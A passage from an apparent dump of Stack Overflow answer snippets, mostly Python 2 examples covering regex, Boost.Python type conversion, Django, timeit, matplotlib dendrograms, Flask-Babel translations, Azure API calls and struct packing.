 'relief': ('relief', 'relief', 'Relief', 'flat', 'flat'),
 'scrollregion': ('scrollregion', 'scrollRegion', 'ScrollRegion', '', ''),
 'selectbackground': ('selectbackground',
                      'selectBackground',
                      'Foreground',
                      'SystemHighlight',
                      'SystemHighlight'),
 'selectborderwidth': ('selectborderwidth',
                       'selectBorderWidth',
                       'BorderWidth',
                       '1',
                       '1'),
 'selectforeground': ('selectforeground',
                      'selectForeground',
                      'Background',
                      'SystemHighlightText',
                      'SystemHighlightText'),
 'state': ('state', 'state', 'State', 'normal', 'normal'),
 'takefocus': ('takefocus', 'takeFocus', 'TakeFocus', '', ''),
 'width': ('width', 'width', 'Width', '10c', '100'),
 'xscrollcommand': ('xscrollcommand',
                    'xScrollCommand',
                    'ScrollCommand',
                    '',
                    ''),
 'xscrollincrement': ('xscrollincrement',
                      'xScrollIncrement',
                      'ScrollIncrement',
                      '0',
                      '0'),
 'yscrollcommand': ('yscrollcommand',
                    'yScrollCommand',
                    'ScrollCommand',
                    '',
                    ''),
 'yscrollincrement': ('yscrollincrement',
                      'yScrollIncrement',
                      'ScrollIncrement',
                      '0',
                      '0')}
</snippet></ROW><ROW><id>11975391</id><snippet>re</snippet></ROW><ROW><id>11975391</id><snippet>import re

# Store your string
my_str = 'red blue green * hello* pink orange 4pgp42g4jg42 * world* violet black'

# Find matches
match = re.findall(r'\*([^\*]*)\*', my_str)

# Print everything
print match

# Iterate
for item in match:
    print item
</snippet></ROW><ROW><id>11975810</id><snippet>getattr(getattr(a, "b"), "c")
</snippet></ROW><ROW><id>11975909</id><snippet>temp_object = DataSet(temp_line_num, temp_data)
</snippet></ROW><ROW><id>11975909</id><snippet>temp_object = DataSet(temp_line_num, temp_data[:])
</snippet></ROW><ROW><id>11975909</id><snippet>temp_object = DataSet(temp_line_num, list(temp_data))
</snippet></ROW><ROW><id>11975909</id><snippet>temp_data</snippet></ROW><ROW><id>11975909</id><snippet>DataSet</snippet></ROW><ROW><id>11975909</id><snippet>[:]</snippet></ROW><ROW><id>11975909</id><snippet>list()</snippet></ROW><ROW><id>11976192</id><snippet>from django.db.models import get_models, signals
from django.conf import settings
from django.utils.translation import ugettext_noop as _

if "notification" in settings.INSTALLED_APPS:
    from notification import models as notification

    def create_notice_types(app, created_models, verbosity, **kwargs):
        notification.create_notice_type("messages_received", _("Message Received"), _("you have received a message"), default=2)
        notification.create_notice_type("messages_sent", _("Message Sent"), _("you have sent a message"), default=1)
        notification.create_notice_type("messages_replied", _("Message Replied"), _("you have replied to a message"), default=1)
        notification.create_notice_type("messages_reply_received", _("Reply Received"), _("you have received a reply to a message"), default=2)
        notification.create_notice_type("messages_deleted", _("Message Deleted"), _("you have deleted a message"), default=1)
        notification.create_notice_type("messages_recovered", _("Message Recovered"), _("you have undeleted a message"), default=1)

    signals.post_syncdb.connect(create_notice_types, sender=notification)
else:
    print "Skipping creation of NoticeTypes as notification app not found"
</snippet></ROW><ROW><id>11976297</id><snippet>&gt;&gt;&gt; import timeit
&gt;&gt;&gt; for i in range(9):
...     print timeit.timeit(stmt='pass', number=10**i)
...
0.0
0.0
0.0
0.0
0.0
0.015625
0.0625
0.468752861023
2.98439407349
</snippet></ROW><ROW><id>11976297</id><snippet>xrange</snippet></ROW><ROW><id>11976297</id><snippet>range</snippet></ROW><ROW><id>11976297</id><snippet>&gt;&gt;&gt; timeit.timeit(stmt='range(10**7)', number=1)
0.71875405311584473
&gt;&gt;&gt; timeit.timeit(stmt='for i in range(10**7): pass', number=1)
1.093757152557373
</snippet></ROW><ROW><id>11976360</id><snippet>scipy.stats.rv_continuous</snippet></ROW><ROW><id>11976360</id><snippet>rv_generic</snippet></ROW><ROW><id>11976360</id><snippet>rv_generic.rvs</snippet></ROW><ROW><id>11976360</id><snippet>self._rvs</snippet></ROW><ROW><id>11976360</id><snippet>self._size</snippet></ROW><ROW><id>11976360</id><snippet>None</snippet></ROW><ROW><id>11976360</id><snippet>**kwds</snippet></ROW><ROW><id>11976360</id><snippet>size</snippet></ROW><ROW><id>11976360</id><snippet>self._size</snippet></ROW><ROW><id>11976360</id><snippet>None</snippet></ROW><ROW><id>11976360</id><snippet>self._size</snippet></ROW><ROW><id>11976462</id><snippet>0x7fff5fab51b0</snippet></ROW><ROW><id>11976462</id><snippet>0x46cb4ec</snippet></ROW><ROW><id>11976462</id><snippet>id()</snippet></ROW><ROW><id>11976462</id><snippet>src/seam_processor.c:47</snippet></ROW><ROW><id>11976658</id><snippet>{% for key, item in myDict.items %}
    {% for innerkey, inneritem in item.items %}
        ...
</snippet></ROW><ROW><id>11976754</id><snippet>re.sub</snippet></ROW><ROW><id>11976754</id><snippet>print(re.sub(r't[^t].', lambda m: m.group(0)[::-1], 'testtext')) # settxett
</snippet></ROW><ROW><id>11976764</id><snippet>import os
import random
from subprocess import call

def get_logger():
    return os.environ.setdefault("LOG_DIR", logger_name())

def logger_name(): return "log" + str(random.random())

print "Process " + str(os.getpid()) + " uses " + get_logger()

call(["python",  "x.py"])
</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>class_&lt;B&gt;( "B", init&lt; A &gt;() )
</snippet></ROW><ROW><id>11976960</id><snippet>class_&lt;B&gt;( "B", init&lt; object &gt;() )
</snippet></ROW><ROW><id>11976960</id><snippet>class_</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>PyObject</snippet></ROW><ROW><id>11976960</id><snippet>isinstance( obj, A )</snippet></ROW><ROW><id>11976960</id><snippet>std::pair&lt; long, long &gt;</snippet></ROW><ROW><id>11976960</id><snippet>PyTupleObject</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>D</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>D</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>init</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>class A
{
public:
  A( long n ) : n_( n ) {};
  long n() { return n_; }
private:
  long n_;
};

class B
{
public:
  B( A a ) : a_( a ) {};
  long doSomething() { return a_.n() * 2; }
private:
  A a_;
};
</snippet></ROW><ROW><id>11976960</id><snippet>using namespace boost::python;
BOOST_PYTHON_MODULE(example)
{
  class_&lt; A &gt;( "A", init&lt; long &gt;() )
    ;

  class_&lt;B&gt;( "B", init&lt; A &gt;() )
    .def( "doSomething", &amp;B::doSomething )
    ;
}
</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>init&lt; A &gt;()</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>A::n()</snippet></ROW><ROW><id>11976960</id><snippet>&gt;&gt;&gt; from example import A, B
&gt;&gt;&gt; a = A( 1 )
&gt;&gt;&gt; b = B( a )
&gt;&gt;&gt; b.doSomething()
2
</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>&gt;&gt;&gt; from example import A, B
&gt;&gt;&gt; class C( A ):
...     def __init__( self, n ):
...         A.__init__( self, n )
... 
&gt;&gt;&gt; c = C( 2 )
&gt;&gt;&gt; b = B( c )
&gt;&gt;&gt; b.doSomething()
4
</snippet></ROW><ROW><id>11976960</id><snippet>&gt;&gt;&gt; from example import A, B
&gt;&gt;&gt; class E: pass
... 
&gt;&gt;&gt; e = E()
&gt;&gt;&gt; b = B( e )
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
Boost.Python.ArgumentError: Python argument types in
    B.__init__(B, instance)
did not match C++ signature:
    __init__(_object*, A)
</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>A::n()</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>get_num()</snippet></ROW><ROW><id>11976960</id><snippet>int</snippet></ROW><ROW><id>11976960</id><snippet>A_from_python</snippet></ROW><ROW><id>11976960</id><snippet>struct A_from_python
{
  static void* convertible( PyObject* obj_ptr )
  {
    // assume it is, for now...
    return obj_ptr;
  }

  // Convert obj_ptr into an A instance
  static void construct(
    PyObject* obj_ptr,
    boost::python::converter::rvalue_from_python_stage1_data* data)
  {
    std::cout &lt;&lt; "constructing A from ";
    PyObject_Print( obj_ptr, stdout, 0 );
    std::cout &lt;&lt; std::endl;

    // Obtain a handle to the 'get_num' method on the python object.
    // If it does not exists, then throw.
    PyObject* n_ptr = 
      boost::python::expect_non_null( 
        PyObject_CallMethod( obj_ptr,
                             (char*)"get_num",
                             (char*)"()"  ));

    long n_val = 0;
    n_val = PyInt_AsLong( n_ptr );
    Py_DECREF( n_ptr );

    // Grab pointer to memory into which to construct the new A
    void* storage = (
      (boost::python::converter::rvalue_from_python_storage&lt; A &gt;*)
       data)-&gt;storage.bytes;

    // in-place construct the new A using the data
    // extracted from the python object
    new ( storage ) A( n_val );

    // Stash the memory chunk pointer for later use by boost.python
    data-&gt;convertible = storage;
  }

  A_from_python()
  {
    boost::python::converter::registry::push_back(
      &amp;convertible,
      &amp;construct,
      boost::python::type_id&lt; A &gt;() );
  }
};
</snippet></ROW><ROW><id>11976960</id><snippet>boost::python::expect_non_null</snippet></ROW><ROW><id>11976960</id><snippet>NULL</snippet></ROW><ROW><id>11976960</id><snippet>get_num</snippet></ROW><ROW><id>11976960</id><snippet>PyObject</snippet></ROW><ROW><id>11976960</id><snippet>boost::python::api::handle</snippet></ROW><ROW><id>11976960</id><snippet>boost::python::api::object</snippet></ROW><ROW><id>11976960</id><snippet>PyObject</snippet></ROW><ROW><id>11976960</id><snippet>using namespace boost::python;
BOOST_PYTHON_MODULE(example)
{
  // register the from-python converter for A
  A_from_python();

  class_&lt; A &gt;( "A", init&lt; long &gt;() )
    ;

  class_&lt;B&gt;( "B", init&lt; A &gt;() )
    .def( "doSomething", &amp;B::doSomething )
    ;
}
</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>&gt;&gt;&gt; from example import A, B
&gt;&gt;&gt; a = A( 4 )
&gt;&gt;&gt; b = B( a )
&gt;&gt;&gt; b.doSomething()
8
&gt;&gt;&gt; class D:
...     def __init__( self, n ):
...         self.n = n
...     def get_num( self ):
...         return self.n
... 
&gt;&gt;&gt; d = D( 5 )
&gt;&gt;&gt; b = B( d )
constructing A from &lt;__main__.D instance at 0xb7f7340c&gt;
&gt;&gt;&gt; b.doSomething()
10
&gt;&gt;&gt; class E: pass
...
&gt;&gt;&gt; e = E()
&gt;&gt;&gt; b = B( e )
constructing A from &lt;__main__.E instance at 0xb7f7520c&gt;
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
AttributeError: get_num
</snippet></ROW><ROW><id>11976960</id><snippet>D::get_num()</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>D</snippet></ROW><ROW><id>11976960</id><snippet>D</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>E::get_num()</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>E</snippet></ROW><ROW><id>11976960</id><snippet>example_ext.py</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>from example import A, B

def monkey_patch_B():
    # Store handle to original init provided by Boost.
    original_init = B.__init__

    # Construct an A object via duck-typing.
    def construct_A( obj ):
        return A( obj.get_num() )

    # Create a new init that will delegate to the original init.
    def new_init( self, obj ):
        # If obj is an instance of A, use it.  Otherwise, construct
        # an instance of A from object.
        a = obj if isinstance( obj, A ) else construct_A ( obj )

        # Delegate to the original init.
        return original_init( self, a )

    # Rebind the new_init.
    B.__init__ = new_init

monkey_patch_B()
</snippet></ROW><ROW><id>11976960</id><snippet>example_ext</snippet></ROW><ROW><id>11976960</id><snippet>example</snippet></ROW><ROW><id>11976960</id><snippet>&gt;&gt;&gt; from example_ext import A, B
&gt;&gt;&gt; a = A( 6 )
&gt;&gt;&gt; b = B( a )
&gt;&gt;&gt; b.doSomething()
12
&gt;&gt;&gt; class D:
...     def __init__( self, n ):
...         self.n = n
...     def get_num( self ):
...         return self.n
... 
&gt;&gt;&gt; d = D( 7 )
&gt;&gt;&gt; b = B( d )
&gt;&gt;&gt; b.doSomething()
14
&gt;&gt;&gt; class E: pass
... 
&gt;&gt;&gt; e = E()
&gt;&gt;&gt; b = B( e )
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
  File "example_ext.py", line 15, in new_init
    a = obj if isinstance( obj, A ) else construct_A ( obj )
  File "example_ext.py", line 9, in construct_A
    return A( obj.get_num() )
AttributeError: E instance has no attribute 'get_num'
</snippet></ROW><ROW><id>11976960</id><snippet>A</snippet></ROW><ROW><id>11976960</id><snippet>B</snippet></ROW><ROW><id>11976960</id><snippet>A_from_python::construct</snippet></ROW><ROW><id>11977124</id><snippet>arr = arr + [num];
</snippet></ROW><ROW><id>11977124</id><snippet>arr.append(num)
</snippet></ROW><ROW><id>11977124</id><snippet>arr</snippet></ROW><ROW><id>11977124</id><snippet>arr</snippet></ROW><ROW><id>11977124</id><snippet>1
4
hello
[2, 3, 5, 7]
--
[2, 3, 5, 7]
arr was printed
[7]
ans 
</snippet></ROW><ROW><id>11977361</id><snippet>&lt;link rel="stylesheet" type="text/css"  href="css/colorschemes/prettify.css" /&gt;
&lt;script type="text/javascript" src="js/prettify/prettify.js"&gt;&lt;/script&gt;
</snippet></ROW><ROW><id>11977368</id><snippet>for d in cur:
    return d[0]
</snippet></ROW><ROW><id>11977368</id><snippet>return [d[0] for d in cur]
</snippet></ROW><ROW><id>11977368</id><snippet>cur</snippet></ROW><ROW><id>11977454</id><snippet>setMaxTemperature(int t)</snippet></ROW><ROW><id>11977454</id><snippet>setMinTemperature(int t)</snippet></ROW><ROW><id>11977454</id><snippet>set</snippet></ROW><ROW><id>11977454</id><snippet>class SomeClass(object):
    def __init__(self, foo="default foo", bar="default bar", baz="default baz"):
        # do something
</snippet></ROW><ROW><id>11977454</id><snippet>s = SomeClass(bar=1, foo=0)
</snippet></ROW><ROW><id>11977454</id><snippet>set</snippet></ROW><ROW><id>11977454</id><snippet>__new__</snippet></ROW><ROW><id>11977454</id><snippet>collections.namedtuple</snippet></ROW><ROW><id>11977454</id><snippet>namedtuple()</snippet></ROW><ROW><id>11977454</id><snippet>StringBuilder</snippet></ROW><ROW><id>11977454</id><snippet>String</snippet></ROW><ROW><id>11977454</id><snippet>str.join</snippet></ROW><ROW><id>11977454</id><snippet>final StringBuilder sb = new StringBuilder();
for(int i = 0; i &lt; 100; i++)
    sb.append("Hello(" + i + ")");
return sb.toString();
</snippet></ROW><ROW><id>11977454</id><snippet>return "".join("Hello({})".format(i) for i in range(100))
</snippet></ROW><ROW><id>11977492</id><snippet>str</snippet></ROW><ROW><id>11977492</id><snippet>def foo(msg):
    s = str(msg)
    print s, type(s)
</snippet></ROW><ROW><id>11977492</id><snippet>import b

b.foo('foo')

# monkey-patch 
import __builtin__
__builtin__.str = unicode

b.foo('foo')

# Results:
#foo &lt;type 'str'&gt;
#foo &lt;type 'unicode'&gt;
</snippet></ROW><ROW><id>11977492</id><snippet>a</snippet></ROW><ROW><id>11977492</id><snippet>str</snippet></ROW><ROW><id>11977492</id><snippet>unicode</snippet></ROW><ROW><id>11977492</id><snippet>b.py</snippet></ROW><ROW><id>11977492</id><snippet>&gt;&gt;&gt; import gevent
&gt;&gt;&gt; from gevent import socket
&gt;&gt;&gt; urls = ['www.google.com', 'www.example.com', 'www.python.org']
&gt;&gt;&gt; jobs = [gevent.spawn(socket.gethostbyname, url) for url in urls]
&gt;&gt;&gt; gevent.joinall(jobs, timeout=2)
&gt;&gt;&gt; [job.value for job in jobs]
['74.125.79.106', '208.77.188.166', '82.94.164.162']  
</snippet></ROW><ROW><id>11977492</id><snippet>&gt;&gt;&gt; from gevent import monkey; monkey.patch_socket()
&gt;&gt;&gt; import urllib2 # it's usable from multiple greenlets now
</snippet></ROW><ROW><id>11977757</id><snippet>&gt;&gt;&gt; v = 12
&gt;&gt;&gt; d = {k:v for k in 'abfhp'}
&gt;&gt;&gt; print d
{'a': 12, 'h': 12, 'b': 12, 'p': 12, 'f': 12}
</snippet></ROW><ROW><id>11977931</id><snippet>QGroupBox()</snippet></ROW><ROW><id>11977995</id><snippet>python convert_obj_three.py -i mesh.obj -o mesh.js</snippet></ROW><ROW><id>11978051</id><snippet>from scipy.cluster.hierarchy import linkage
from scipy.cluster.hierarchy import dendrogram
from scipy.spatial.distance import pdist
import matplotlib
from matplotlib import pyplot as plt
import numpy as np
from numpy import arange

fig = plt.figure(figsize=(5,7))
ax1 = plt.subplot(2, 1, 1)
cm = matplotlib.cm.Blues
X = np.random.random([5,5])
pmat = pdist(X, "euclidean")
linkmat = linkage(pmat)
dendrogram(linkmat)
x0,x1 = ax1.get_xlim()
y0,y1 = ax1.get_ylim()
ax1.set_aspect((x1-x0)/(y1-y0))

plt.subplot(2, 1, 2, aspect=1)
labels = ["a", "b", "c", "d", "e", "f"]
Y = np.random.random([6,6])
plt.xticks(arange(0.5, 7.5, 1))
plt.gca().set_xticklabels(labels)
plt.pcolor(Y)
plt.colorbar()

# add a colorbar to the first plot and immediately make it invisible
cb = plt.colorbar(ax=ax1)
cb.ax.set_visible(False)

plt.show()
</snippet></ROW><ROW><id>11978059</id><snippet>ivd = dict((v, k) for (k, v) in a.iteritems())
</snippet></ROW><ROW><id>11978059</id><snippet>ivd = {v: k for (k, v) in a.items()}
</snippet></ROW><ROW><id>11978098</id><snippet>my_website/translations/pt/LC_MESSAGES/
my_website/translations/en/LC_MESSAGES/
</snippet></ROW><ROW><id>11978098</id><snippet>File:
my_website/translations/pt/LC_MESSAGES/messages.po 
Content:
msgid "Hello world"
msgstr "Olá mundo"
</snippet></ROW><ROW><id>11978098</id><snippet> pybabel compile -d translations to create mo file.
</snippet></ROW><ROW><id>11978098</id><snippet>app.config['BABEL_DEFAULT_LOCALE'] = 'pt_BR' #(context locale to load language).
</snippet></ROW><ROW><id>11978098</id><snippet>&lt;h1&gt;{{ _('Hello world') }}&lt;/h1&gt;
</snippet></ROW><ROW><id>11978111</id><snippet>newlist = [int(x) for x in numbers if x &gt; 0]
</snippet></ROW><ROW><id>11978111</id><snippet>newlist = [round(x) for x in numbers if x &gt; 0]
</snippet></ROW><ROW><id>11978257</id><snippet>ROOT_URLCONF = '&lt;INSERT PROJECT NAME&gt;.urls'
</snippet></ROW><ROW><id>11978257</id><snippet>ROOT_URLCONF = 'projectname.urls'
</snippet></ROW><ROW><id>11978280</id><snippet>import httplib

conn = httplib.HTTPSConnection('management.core.windows.net', cert_file='cert.pem', key_file='key.pem')
conn.request('GET', '/%s/services/storageservices' % subscription_id, headers={'x-ms-version': '2011-02-25'})
print conn.getresponse().read()
</snippet></ROW><ROW><id>11978280</id><snippet>cert_file</snippet></ROW><ROW><id>11978280</id><snippet>key_file</snippet></ROW><ROW><id>11978280</id><snippet>openssl</snippet></ROW><ROW><id>11978280</id><snippet>openssl</snippet></ROW><ROW><id>11978280</id><snippet>.publishsettings</snippet></ROW><ROW><id>11978280</id><snippet>openssl</snippet></ROW><ROW><id>11978280</id><snippet>curl</snippet></ROW><ROW><id>11978280</id><snippet>.publishsettings</snippet></ROW><ROW><id>11978280</id><snippet>pip install lxml pyopenssl</snippet></ROW><ROW><id>11978280</id><snippet>import httplib
import argparse
from StringIO import StringIO
from lxml import etree
import base64
from OpenSSL.crypto import *

parser = argparse.ArgumentParser()
parser.add_argument('file', metavar='file', type=str, help='Your .publishsettings file.')
args = parser.parse_args()

tree = etree.parse(args.file)
pp = tree.find('PublishProfile')
cert = load_pkcs12(base64.decodestring(pp.get('ManagementCertificate')))
with open('cert.pem', 'w') as f:
    f.write(dump_certificate(FILETYPE_PEM, cert.get_certificate()))
    f.write(dump_privatekey(FILETYPE_PEM, cert.get_privatekey()))
subscription_id = pp.find('Subscription').get('Id')

conn = httplib.HTTPSConnection('management.core.windows.net', cert_file='cert.pem')
conn.request('GET', '/%s/services/storageservices' % subscription_id, headers={'x-ms-version': '2011-02-25'})
for e in etree.parse(StringIO(conn.getresponse().read())).iterfind('//{http://schemas.microsoft.com/windowsazure}ServiceName'): print e.text
</snippet></ROW><ROW><id>11978498</id><snippet>        if "v1" or "v2" in file:
</snippet></ROW><ROW><id>11978498</id><snippet>        if ("v1") or ("v2" in file):
</snippet></ROW><ROW><id>11978498</id><snippet>True</snippet></ROW><ROW><id>11978498</id><snippet>bool("v1")==True</snippet></ROW><ROW><id>11978498</id><snippet>        if any(x in file for x in ["v1", "v2"]):
</snippet></ROW><ROW><id>11978498</id><snippet>        if "v1" in file or "v2" in file:
</snippet></ROW><ROW><id>11978498</id><snippet>any</snippet></ROW><ROW><id>11978528</id><snippet>$ gvfs-set-attribute $FOLDER -t stringv metadata::emblems new urgent
</snippet></ROW><ROW><id>11978528</id><snippet>$ kwriteconfig --file "$FOLDER/.directory" --group 'Desktop Entry' --key Icon /path/to/icon.png
</snippet></ROW><ROW><id>11978780</id><snippet>DEFAULT_BATCH_URL = 'http://www.google.com/calendar/feeds/default/private/full/batch'
</snippet></ROW><ROW><id>11978780</id><snippet>url = 'http://www.google.com/calendar/feeds/.../private/full/batch'
</snippet></ROW><ROW><id>11978957</id><snippet>tag.attrs = [(attr, js_regex.sub('', val)) for attr, val in tag.attrs.items() if attr in allowed_tags[tag.name]]
</snippet></ROW><ROW><id>11978957</id><snippet>tag.attrs = dict((attr, js_regex.sub('', val)) for attr, val in tag.attrs.items() if attr in allowed_tags[tag.name])
</snippet></ROW><ROW><id>11978984</id><snippet>get_ts</snippet></ROW><ROW><id>11978984</id><snippet>for line in rows:                            
    if get_ts(line) &gt; log_datetime:                 
        timeseries.append(line)
</snippet></ROW><ROW><id>11978984</id><snippet>if get_ts(line[0]) &gt; log_datetime:                 
    timeseries.append(line)
</snippet></ROW><ROW><id>11979067</id><snippet>y = x.__class__()
</snippet></ROW><ROW><id>11979067</id><snippet>y = type(x)()  #New style classes only
</snippet></ROW><ROW><id>11979067</id><snippet>object</snippet></ROW><ROW><id>11979162</id><snippet>UserProfile.favorite_books.through.objects.filter(book_id=book.id).count()
</snippet></ROW><ROW><id>11979308</id><snippet>Tkinter</snippet></ROW><ROW><id>11979308</id><snippet>class Root(object):
    def __init__(self):
        self.children = []

class Node(object):
   def __init__(self,parent):
        self.parent = parent
        parent.children.append(self)
</snippet></ROW><ROW><id>11979308</id><snippet>Root</snippet></ROW><ROW><id>11979308</id><snippet>children</snippet></ROW><ROW><id>11979308</id><snippet>parent</snippet></ROW><ROW><id>11979308</id><snippet>r = Root()
n = Node(r)
r.children[0] is n  #True
n.parent is r  #True
</snippet></ROW><ROW><id>11979308</id><snippet>Node</snippet></ROW><ROW><id>11979308</id><snippet>children</snippet></ROW><ROW><id>11979308</id><snippet>Node</snippet></ROW><ROW><id>11979308</id><snippet>Node</snippet></ROW><ROW><id>11979308</id><snippet>weakref.ref</snippet></ROW><ROW><id>11979357</id><snippet>around</snippet></ROW><ROW><id>11979357</id><snippet>def myround(a, decimals=1):
     return np.around(a-10**(-(decimals+5)), decimals=decimals)

In [22]: myround(np.array([ 1.21,  5.77,  3.43]), 1)
Out[22]: array([ 1.2,  5.8,  3.4])

In [23]: myround(np.array([ 0.55,  0.65,  0.05]), 1)
Out[23]: array([ 0.5,  0.6,  0. ])
</snippet></ROW><ROW><id>11979357</id><snippet>5</snippet></ROW><ROW><id>11979371</id><snippet>self</snippet></ROW><ROW><id>11979371</id><snippet>b</snippet></ROW><ROW><id>11979371</id><snippet>method p() in class B</snippet></ROW><ROW><id>11979371</id><snippet>p()</snippet></ROW><ROW><id>11979371</id><snippet>A's p()</snippet></ROW><ROW><id>11979371</id><snippet>class B(A):
    def p(self):
             super(B, self).p()
             print 'B'
    def f(self):
             super(B, self).f()
             self.x*=2
</snippet></ROW><ROW><id>11979371</id><snippet>A.p()</snippet></ROW><ROW><id>11979371</id><snippet>class A(object):
    x=5
    @staticmethod
    def p():
        print 'A'
    def f(self):
        A.p()
        self.x+=1
</snippet></ROW><ROW><id>11979371</id><snippet>&gt;&gt;&gt; b = B()
&gt;&gt;&gt; b.f()
A
&gt;&gt;&gt; b.x
12
&gt;&gt;&gt; b.p()
A
B
</snippet></ROW><ROW><id>11979371</id><snippet>b.p()</snippet></ROW><ROW><id>11979371</id><snippet>b.f()</snippet></ROW><ROW><id>11979431</id><snippet>import time
# record when person was first hit.
previousHit = time.time()

if time.time() - previousHit &gt; 10:
    # The rest of your logic for getting hit.
    previousHit = time.time() # Reset the timer to get the hit again.
</snippet></ROW><ROW><id>11979497</id><snippet>if os.getenv("TZ"):
    os.unsetenv("TZ")
</snippet></ROW><ROW><id>11979604</id><snippet>import array
import numpy as np
a = array.array("d")
a.extend([0,1,2])
a.extend([3,4,5])
b = np.frombuffer(a, np.float).reshape(-1, 3)
</snippet></ROW><ROW><id>11979794</id><snippet>&gt;&gt;&gt; data = r'''&lt;clade&gt;
...  &lt;name&gt;MnPV1&lt;/name&gt;
...  &lt;annotation&gt;
...    &lt;desc&gt;Iotapapillomavirus 1&lt;/desc&gt;
...  &lt;/annotation&gt;
...  &lt;chart&gt;
...    &lt;group&gt;Iota&lt;/group&gt;
...  &lt;/chart&gt;
...  &lt;branch_length&gt;1.0&lt;/branch_length&gt;
... &lt;/clade&gt;'''
...
&gt;&gt;&gt; tree = lxml.etree.XML(data)
&gt;&gt;&gt; for name in tree.xpath('//group[text()="Iota"]/../preceding-sibling::name'):
...   name.attrib['bgstyle'] = 'green'
...
&gt;&gt;&gt; print lxml.etree.tostring(tree, pretty_print=True)
&lt;clade&gt;
 &lt;name bgstyle="green"&gt;MnPV1&lt;/name&gt;
 &lt;annotation&gt;
   &lt;desc&gt;Iotapapillomavirus 1&lt;/desc&gt;
 &lt;/annotation&gt;
 &lt;chart&gt;
   &lt;group&gt;Iota&lt;/group&gt;
 &lt;/chart&gt;
 &lt;branch_length&gt;1.0&lt;/branch_length&gt;
&lt;/clade&gt;

&gt;&gt;&gt;
</snippet></ROW><ROW><id>11979794</id><snippet>getparent</snippet></ROW><ROW><id>11979794</id><snippet>getprevious</snippet></ROW><ROW><id>11979794</id><snippet>getparent</snippet></ROW><ROW><id>11979794</id><snippet>getprevious</snippet></ROW><ROW><id>11979808</id><snippet>addColumn()</snippet></ROW><ROW><id>11979836</id><snippet>ServerName = form.cleaned_data.get('ServerName')

py_script = """
def ping():
    run('ping %(ServerName)s')
""" % locals()

response.write(py_script)
</snippet></ROW><ROW><id>11979836</id><snippet>ServerName = form.cleaned_data.get('ServerName')
foo = 'foo'
bar = 'bar'

py_script = """
def ping():
    run('ping %(ServerName)s')
    print "[%(foo)s]"
    print '(%(bar)s)'
""" % locals()

response.write(py_script)
</snippet></ROW><ROW><id>11979976</id><snippet>for key, value in assets.items():
</snippet></ROW><ROW><id>11979976</id><snippet>dict</snippet></ROW><ROW><id>11979976</id><snippet>items()</snippet></ROW><ROW><id>11980088</id><snippet>from legacy_module import *</snippet></ROW><ROW><id>11980129</id><snippet>/post/post/1485/
</snippet></ROW><ROW><id>11980129</id><snippet>posts/urls.py</snippet></ROW><ROW><id>11980129</id><snippet>urlpatterns = patterns('',
    ...
    url(r'^(?P&lt;post_id&gt;\d+)/$', 'post.views.post_page'),
)
</snippet></ROW><ROW><id>11980377</id><snippet>class datetime(datetime)</snippet></ROW><ROW><id>11980695</id><snippet>import struct

type_map = {
        'string type': 's',
        'short int type': 'h',
        'long int type': 'q',
        'float': 'f'
        }

conversion = {
        's': str,
        'h': int,
        'q': int,
        'f': float
        }


def do_pack(types, data):
    if len(types) != len(data):
        raise Excpetion("wrong lengths")
    packing = '&lt;'
    data_iter = []
    for i, struct_type in enumerate(types):
        t = type_map[struct_type]
        if t == 's':
            packing += '%ds' % len(data[i]) 
            data_iter.append(data[i])
        else:
            packing += t
            data_iter.append(conversion[t](data[i]))
    return struct.pack(packing, *data_iter), packing

packer = [['string type','short int type','long int type','string type','float'],['Stackoverflow','32','0','any stringgg','55.0'],['anystring','16','1654657987984','striiingg','2.5']]

types = packer[0]
for data_set in packer[1:]:
    binary, packing = do_pack(types, data_set)
    print struct.unpack(packing, binary)
</snippet></ROW><ROW><id>11980695</id><snippet>('Stackoverflow', 32, 0, 'any stringgg', 55.0)
('anystring', 16, 1654657987984, 'striiingg', 2.5)
</snippet></ROW><ROW><id>11980701</id><snippet>from PyQt4 import QtCore, QtGui
import sys

app = QtGui.QApplication(sys.argv)
QtGui.qApp = app

pointListBox = QtGui.QTreeWidget()

header=QtGui.QTreeWidgetItem(["Tree","First","secondo"])
#...
